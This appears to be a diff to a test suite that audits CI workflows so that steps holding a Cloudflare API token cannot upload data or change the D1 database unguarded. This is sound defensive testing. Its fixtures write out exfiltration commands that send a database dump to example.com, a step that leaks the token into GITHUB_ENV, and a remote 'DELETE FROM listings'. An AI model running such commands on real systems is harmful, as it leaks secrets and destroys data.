@@ -581,15 +581,95 @@ describe('D1 data stays in Cloudflare', () => {
     'actions/github-script@v9',
     'actions/upload-artifact@v7'
   ])
-  const outboundUpload =
-    /\bgh\s+(?:release\s+(?:upload|create)|gist)\b|\bcurl\b[^\n]*?(?:\s-T\b|--upload-file|\s-F\b|--form\b|\s-d\s*@|--data(?:-binary|-raw|-urlencode)?\s+@)|\bwget\b[^\n]*--post-(?:file|data)/u
   const bookmarkCommand = (environment: string) =>
     `pnpm tsx scripts/cloudflare-release.ts bookmark ${environment}`
-  /** Credentialed commands that change no D1 data: reads, the bookmark, and the Worker deploy. */
-  const readOnlyRelease =
-    /^pnpm tsx scripts\/cloudflare-release\.ts (?:bookmark|plan-release|list-migrations|check-database|verify-import|deploy) (?:staging|production)$/u
-  const programs =
-    /(?:^|[\s;&|(`$])(?:pnpm|npx|node|tsx|wrangler|curl|wget|gh|python3?|bash|sh)\b[^\n;&|)]*/gu
+  const escapeRegExp = (value: string) => value.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&')
+  /**
+   * The only steps holding the Cloudflare token that are not D1 changes, matched on their whole
+   * `run`. Everything else that holds the token is a change and needs a bookmark (fail closed):
+   * an unknown launcher, a path-invoked script, or an action all count.
+   */
+  const message = '[^"$`\\\\\\n]*'
+  const tokenStepsWithoutChanges: Array<{ id: string; run: RegExp }> = [
+    {
+      id: 'credential check (fail)',
+      run: new RegExp(
+        `^if \\[ -z "\\$CLOUDFLARE_API_TOKEN" \\] \\|\\| \\[ -z "\\$CLOUDFLARE_ACCOUNT_ID" \\]; then\\n  echo "::error::${message}"\\n  exit 1\\nfi\\n?$`,
+        'u'
+      )
+    },
+    {
+      id: 'credential check (skip)',
+      run: new RegExp(
+        `^if \\[ -n "\\$CLOUDFLARE_API_TOKEN" \\] && \\[ -n "\\$CLOUDFLARE_ACCOUNT_ID" \\]; then\\n  echo "configured=true" >> "\\$GITHUB_OUTPUT"\\n  exit 0\\nfi\\necho "configured=false" >> "\\$GITHUB_OUTPUT"\\nmessage="${message}"\\necho "::(?:notice|warning) title=${message}::\\$message"\\necho "\\$message" >> "\\$GITHUB_STEP_SUMMARY"\\n?$`,
+        'u'
+      )
+    },
+    {
+      id: 'read-only release command',
+      run: /^pnpm tsx scripts\/cloudflare-release\.ts (?:bookmark|plan-release|list-migrations|check-database|verify-import|deploy) (?:staging|production)\n?$/u
+    },
+    {
+      id: 'Deploy Production plan',
+      run: new RegExp(
+        `^${escapeRegExp(
+          [
+            'plan="$(pnpm tsx scripts/cloudflare-release.ts plan-release production)"',
+            'echo "$plan"',
+            'mode="$(jq -r .mode <<<"$plan")"',
+            'case "$mode" in',
+            '  database-and-worker | worker-only) ;;',
+            '  *)',
+            '    echo "::error::plan-release returned no release mode."',
+            '    exit 1',
+            '    ;;',
+            'esac',
+            'echo "mode=$mode" >> "$GITHUB_OUTPUT"',
+            `echo "Release mode: $mode (pending migrations: $(jq -r '.pendingMigrations | join(", ")' <<<"$plan"))" >> "$GITHUB_STEP_SUMMARY"`
+          ].join('\n')
+        )}\\n?$`,
+        'u'
+      )
+    }
+  ]
+  const tokenStepWithoutChanges = (step: WorkflowStep) =>
+    !step.uses && tokenStepsWithoutChanges.find(known => known.run.test(step.run ?? ''))?.id
+  /** Files that hand values to later steps: a token step outside the list may not write them. */
+  const workflowCommandFiles = /\bGITHUB_(?:ENV|PATH|OUTPUT|STATE)\b/u
+  /**
+   * Network uploads, read per shell command (split at `|`, `;`, `&`, newlines, and `)`), so
+   * `curl -sSI … | awk -F': '` is not an upload but `curl -T dump.sql …` is.
+   */
+  function outboundUploads(run: string): string[] {
+    return run
+      .split(/[|;&\n)]/u)
+      .map(command => command.trim())
+      .filter(command => {
+        const words = command.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/gu) ?? []
+        const at = words.findIndex(word => /(?:^|\/)(?:curl|wget|gh)$/u.test(word))
+        if (at === -1) return false
+        const program = words[at]?.split('/').at(-1)
+        const args = words.slice(at + 1)
+        if (program === 'gh')
+          return (
+            args[0] === 'gist' ||
+            (args[0] === 'release' && (args[1] === 'upload' || args[1] === 'create')) ||
+            (args[0] === 'api' &&
+              args.some(arg => /^(?:--input|-[fF]|--(?:raw-)?field)$/u.test(arg)))
+          )
+        if (program === 'wget')
+          return args.some(arg =>
+            /^--(?:post|body)-(?:file|data)\b|^--method=(?:POST|PUT|PATCH)$/iu.test(arg)
+          )
+        return args.some(
+          (arg, index) =>
+            /^-[a-zA-Z]*[TF]$|^-[TF].+|^--(?:upload-file|form|form-string)(?:=|$)/u.test(arg) ||
+            /^-d@|^--data(?:-binary|-raw|-urlencode)?=@/u.test(arg) ||
+            (/^(?:-d|--data(?:-binary|-raw|-urlencode)?)$/u.test(arg) &&
+              /^['"]?@/u.test(args[index + 1] ?? ''))
+        )
+      })
+  }
   /** A status function replaces `if`'s implicit `success()`, so a failed bookmark stops nothing. */
   const statusFunction = /\b(?:always|failure|cancelled|success)\s*\(/u
   /** D1 writers without a bookmark, each justified in RELEASE_GUARDS. */
@@ -641,10 +721,32 @@ describe('D1 data stays in Cloudflare', () => {
     return allowed ? problems : [...problems, `${step.uses} ${values.join(' ')} is not allowlisted`]
   }
 
-  const holdsToken = (workflow: WorkflowDefinition, job: WorkflowJob, step?: WorkflowStep) =>
-    JSON.stringify([(workflow as { env?: unknown }).env ?? {}, job.env ?? {}, step ?? {}]).includes(
-      'CLOUDFLARE_API_TOKEN'
-    )
+  const tokenIn = (value: unknown) => JSON.stringify(value ?? {}).includes('CLOUDFLARE_API_TOKEN')
+  /** The step gets the token: from the workflow's or job's `env`, or its own `env` or `with`. */
+  const stepHoldsToken = (workflow: WorkflowDefinition, job: WorkflowJob, step: WorkflowStep) =>
+    tokenIn((workflow as { env?: unknown }).env) || tokenIn(job.env) || tokenIn(step)
+  /** Some step of the job gets the token, or the job or workflow passes it to every step. */
+  const jobHoldsToken = (workflow: WorkflowDefinition, job: WorkflowJob) =>
+    tokenIn((workflow as { env?: unknown }).env) || tokenIn(job)
+
+  /** Uploads and unreviewed actions in a job that holds the token, wherever the token is. */
+  function credentialedJobViolations(workflows: Array<[string, WorkflowDefinition]>) {
+    const jobs: string[] = []
+    const violations: string[] = []
+    for (const [file, workflow] of workflows) {
+      for (const [name, job] of Object.entries(workflow.jobs)) {
+        if (!jobHoldsToken(workflow, job)) continue
+        jobs.push(`${file}:${name}`)
+        for (const step of stepsOf(job)) {
+          if (step.uses && !credentialedJobActions.has(step.uses))
+            violations.push(`${file}:${name}: ${step.uses} is not a reviewed action`)
+          for (const upload of outboundUploads(step.run ?? ''))
+            violations.push(`${file}:${name}: uploads with \`${upload}\``)
+        }
+      }
+    }
+    return { jobs: jobs.sort(), violations }
+  }
 
   /**
    * Every step that gets the Cloudflare token and may change D1 (anything but a credential
@@ -658,13 +760,14 @@ describe('D1 data stays in Cloudflare', () => {
       for (const [name, job] of Object.entries(workflow.jobs)) {
         const steps = stepsOf(job)
         steps.forEach((step, index) => {
-          if (!holdsToken(workflow, job, step)) return
-          const invoked = [...(step.run ?? '').matchAll(programs)].map(match =>
-            match[0].replace(/^[\s;&|(`$]/u, '').trim()
-          )
-          if (!step.uses && invoked.length === 0) return // a credential presence check
-          if (!step.uses && invoked.every(command => readOnlyRelease.test(command))) return
+          if (!stepHoldsToken(workflow, job, step)) return
           const label = `${file}:${name}:${step.run?.trim() ?? step.uses}`
+          if (tokenStepWithoutChanges(step)) return
+          // No handoff: a later step without `env` could otherwise get the token.
+          if (workflowCommandFiles.test(step.run ?? ''))
+            violations.push(
+              `${label}: a step holding the token may not write GITHUB_ENV, GITHUB_PATH, GITHUB_OUTPUT, or GITHUB_STATE`
+            )
           if (unbookmarkedWriters.has(label)) return
           const environment = environmentName(job)
           changes.push(`${file}:${name}:${environment}`)
@@ -743,29 +846,66 @@ describe('D1 data stays in Cloudflare', () => {
   })
 
   it('keeps uploads off the network in every job that holds the Cloudflare token', () => {
-    for (const [file, workflow] of allWorkflows()) {
-      for (const [name, job] of Object.entries(workflow.jobs)) {
-        if (!holdsToken(workflow, job)) continue
-        for (const step of stepsOf(job)) {
-          if (step.uses)
-            expect(credentialedJobActions.has(step.uses), `${file}:${name}: ${step.uses}`).toBe(
-              true
-            )
-          expect(step.run ?? '', `${file}:${name}: ${step.name}`).not.toMatch(outboundUpload)
+    const { jobs, violations } = credentialedJobViolations(allWorkflows())
+    expect(violations).toEqual([])
+    // The check runs on every credentialed job, wherever the token is passed (#101 round 2).
+    expect(jobs).toEqual([
+      'approve-d1-submission.yml:review',
+      'bootstrap-production-d1.yml:bootstrap',
+      'deploy-production.yml:release',
+      'deploy-staging.yml:deploy',
+      'notify-d1-submissions.yml:notify',
+      'publish-d1.yml:publish'
+    ])
+    // The reviewer's probe: a token-less step in a credentialed job.
+    const publish = loadWorkflow('publish-d1.yml')
+    const job = publish.jobs.publish as WorkflowJob
+    const probe: WorkflowDefinition = {
+      ...publish,
+      jobs: {
+        publish: {
+          ...job,
+          steps: [
+            ...stepsOf(job),
+            {
+              run: 'gh gist create --public "$RUNNER_TEMP/out.json" && curl -T "$RUNNER_TEMP/out.json" https://example.com/'
+            },
+            { uses: 'some-org/some-action@v1' }
+          ]
         }
       }
     }
+    expect(credentialedJobViolations([['publish-d1.yml', probe]]).violations).toEqual([
+      'publish-d1.yml:publish: uploads with `gh gist create --public "$RUNNER_TEMP/out.json"`',
+      'publish-d1.yml:publish: uploads with `curl -T "$RUNNER_TEMP/out.json" https://example.com/`',
+      'publish-d1.yml:publish: some-org/some-action@v1 is not a reviewed action'
+    ])
     for (const command of [
       'gh release upload v1 dump.sql',
-      'gh gist create dump.sql',
-      'curl -T dump.sql https://example.com/',
-      'curl -sS --data-binary @dump.sql https://example.com/',
-      'wget --post-file=dump.sql https://example.com/'
+      'gh release create v1 dump.sql',
+      'gh api repos/o/r/issues -F body=@dump.sql',
+      'curl -sS -T dump.sql https://example.com/',
+      'curl -sST dump.sql https://example.com/',
+      'curl --upload-file dump.sql https://example.com/',
+      'curl -F file=@dump.sql https://example.com/',
+      'curl --form "file=@dump.sql" https://example.com/',
+      'curl -d @dump.sql https://example.com/',
+      'curl -d@dump.sql https://example.com/',
+      "curl --data-binary '@dump.sql' https://example.com/",
+      '/usr/bin/curl --data-binary=@dump.sql https://example.com/',
+      'wget --post-file=dump.sql https://example.com/',
+      'wget --method=PUT --body-file=dump.sql https://example.com/'
     ]) {
-      expect(command).toMatch(outboundUpload)
+      expect(outboundUploads(command), command).toEqual([command])
     }
-    // The production HTTP gates read headers with curl; that is not an upload.
-    expect('curl -sSI https://best.serp.co').not.toMatch(outboundUpload)
+    // The HTTP gates read headers with curl and split them with awk: not an upload.
+    for (const command of [
+      `server="$(curl -sSI https://best.serp.co | tr -d '\\r' | awk -F': ' 'tolower($1) == "server" { print $2 }')"`,
+      'curl -sS -d "name=value" https://example.com/',
+      'gh workflow run x.yml'
+    ]) {
+      expect(outboundUploads(command), command).toEqual([])
+    }
   })
 
   it('bookmarks D1 directly before every step that can change it, and only after success', () => {
@@ -848,7 +988,15 @@ describe('D1 data stays in Cloudflare', () => {
         env: token,
         run: 'curl -sS -X POST "https://api.cloudflare.com/client/v4/accounts/x/d1/database/y/query"'
       },
-      { env: token, uses: './.github/actions/anything' }
+      { env: token, uses: './.github/actions/anything' },
+      // Round 2 probes: launchers the old program list did not know.
+      { env: token, run: 'npm run db:publish:production -- d1/publications/x.yaml' },
+      {
+        env: token,
+        run: './node_modules/.bin/wrangler d1 execute best-serp-co-production --remote --command "DELETE FROM listings"'
+      },
+      { env: token, run: './scripts/x.sh' },
+      { env: token, run: 'if [ -z "$CLOUDFLARE_API_TOKEN" ]; then exit 1; fi; ./scripts/x.sh' }
     ] satisfies WorkflowStep[]) {
       const { changes, violations } = d1ChangeAudit([['cleanup.yml', workflow([step])]])
       expect(changes, JSON.stringify(step)).toEqual(['cleanup.yml:cleanup:production'])
@@ -865,19 +1013,78 @@ describe('D1 data stays in Cloudflare', () => {
       ]
     ])
     expect(guarded.violations).toEqual([])
-    // Reads, credential checks, and the Worker deploy are not D1 changes.
-    expect(
-      d1ChangeAudit([
-        [
-          'reads.yml',
-          workflow([
-            { env: token, run: 'if [ -z "$CLOUDFLARE_API_TOKEN" ]; then exit 1; fi' },
-            { env: token, run: 'pnpm tsx scripts/cloudflare-release.ts verify-import production' },
-            { env: token, run: 'pnpm tsx scripts/cloudflare-release.ts deploy production' }
-          ])
-        ]
-      ]).changes
-    ).toEqual([])
+    // Only the exact credential checks, read-only release commands, the Worker deploy, and the
+    // Deploy Production plan are not D1 changes.
+    const reads = d1ChangeAudit([
+      [
+        'reads.yml',
+        workflow([
+          {
+            env: token,
+            run: 'if [ -z "$CLOUDFLARE_API_TOKEN" ] || [ -z "$CLOUDFLARE_ACCOUNT_ID" ]; then\n  echo "::error::Missing secrets."\n  exit 1\nfi\n'
+          },
+          { env: token, run: 'pnpm tsx scripts/cloudflare-release.ts verify-import production' },
+          { env: token, run: 'pnpm tsx scripts/cloudflare-release.ts deploy production' }
+        ])
+      ]
+    ])
+    expect(reads).toEqual({ changes: [], violations: [] })
+  })
+
+  it('refuses to hand the token to a later step (#101 round 2)', () => {
+    const token = {
+      CLOUDFLARE_ACCOUNT_ID: secret('CLOUDFLARE_ACCOUNT_ID'),
+      CLOUDFLARE_API_TOKEN: secret('CLOUDFLARE_API_TOKEN')
+    }
+    // The reviewer's probe: the token goes to GITHUB_ENV, and a step without `env` uses it.
+    const handoff: WorkflowDefinition = {
+      jobs: {
+        cleanup: {
+          environment: 'production',
+          'runs-on': 'ubuntu-latest',
+          steps: [
+            {
+              env: token,
+              run: 'echo "CLOUDFLARE_API_TOKEN=$CLOUDFLARE_API_TOKEN" >> "$GITHUB_ENV"'
+            },
+            {
+              run: 'pnpm exec wrangler d1 execute best-serp-co-production --remote --command "DELETE FROM listings"'
+            }
+          ]
+        }
+      },
+      on: { workflow_dispatch: null }
+    }
+    const audit = d1ChangeAudit([['cleanup.yml', handoff]])
+    expect(audit.violations.join('\n')).toContain('may not write GITHUB_ENV')
+    expect(audit.violations.join('\n')).toContain('must directly follow')
+    for (const file of ['GITHUB_PATH', 'GITHUB_OUTPUT', 'GITHUB_STATE']) {
+      const step = { env: token, run: `echo "x=1" >> "$${file}"` }
+      expect(
+        d1ChangeAudit([
+          [
+            'cleanup.yml',
+            { ...handoff, jobs: { cleanup: { ...handoff.jobs.cleanup, steps: [step] } } }
+          ]
+        ]).violations.join('\n'),
+        file
+      ).toContain('may not write')
+    }
+    // A job-level token reaches every step, so every step is audited.
+    const jobWide: WorkflowDefinition = {
+      jobs: {
+        cleanup: {
+          env: token,
+          environment: 'production',
+          'runs-on': 'ubuntu-latest',
+          steps: [{ run: 'node scripts/anything.mjs' }]
+        }
+      },
+      on: { workflow_dispatch: null }
+    }
+    expect(d1ChangeAudit([['cleanup.yml', jobWide]]).changes).toEqual([
+      'cleanup.yml:cleanup:production'
+    ])
   })
 })
 
